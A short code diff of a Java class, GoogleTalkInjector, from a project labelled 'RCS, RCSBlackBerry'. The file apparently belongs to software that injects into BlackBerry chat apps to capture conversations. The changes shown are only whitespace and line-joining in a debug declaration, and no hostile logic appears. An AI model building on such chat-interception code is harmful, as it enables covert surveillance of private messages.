@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.injection.injectors;
 
 import blackberry.debug.Debug;
@@ -16,8 +16,7 @@ import blackberry.injection.injectors.group.ChatGroupInjector;
 public class GoogleTalkInjector extends ChatGroupInjector {
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("GTalkInjector",
-            DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("GTalkInjector", DebugLevel.VERBOSE);
 
     //#endif
 
